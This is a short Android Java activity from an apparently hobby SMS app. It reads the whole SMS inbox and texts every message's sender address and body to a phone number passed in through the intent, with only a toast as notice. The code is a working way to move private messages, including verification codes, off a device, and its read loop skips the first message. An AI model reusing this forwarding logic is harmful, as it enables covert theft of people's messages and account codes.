package com.example.preetham.msg1;

import android.Manifest;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.provider.Telephony;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;

public class Read_sms extends AppCompatActivity {
    String message,send1;
    public String listString = "";
    public SmsManager sms1=SmsManager.getDefault();
    public ArrayList<String> sms= new ArrayList<String>();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_read_sms);
        Bundle b=getIntent().getExtras();

         message=b.getString("message");
         send1=b.getString("sender");
        TextView et=findViewById(R.id.textView9);

        et.setText(("number:"+send1));


        if(fetchInbox()!=null)
        {
            for (Object s : sms)
            {
                listString = s + "\t";
                sms1.sendTextMessage(send1, null,listString, null,null);
            }

            Toast.makeText(getApplicationContext(), "Message is being sent",
                    Toast.LENGTH_LONG).show();

        }


    }
    public ArrayList fetchInbox()
    {

        Uri uriSms = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(uriSms, new String[]{"_id", "address", "date", "body"},null,null,null);
        cursor.moveToFirst();
        while  (cursor.moveToNext())
        {
            String address = cursor.getString(1);
            String body = cursor.getString(3);
            sms.add("Address: "+address+" SMS: "+body+";");
            }
        cursor.close();
        return sms;

    }

}